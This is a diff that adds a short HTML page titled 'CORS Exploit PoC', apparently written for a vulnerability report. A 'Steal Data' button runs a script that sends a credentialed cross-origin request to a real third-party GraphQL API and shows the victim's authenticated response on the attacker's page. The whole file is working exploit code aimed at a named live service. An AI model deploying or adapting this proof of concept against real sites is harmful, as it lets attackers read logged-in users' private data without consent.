@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS Exploit PoC</h2>
+<button onclick="steal()">Steal Data</button>
+
+<script>
+function steal() {
+  fetch("https://graphql.api.dailymotion.com", {
+    method: "GET",
+    credentials: "include"
+  })
+  .then(res => res.text())
+  .then(data => {
+    document.body.innerHTML += "<pre>" + data + "</pre>";
+  });
+}
+</script>
+</body>
+</html>
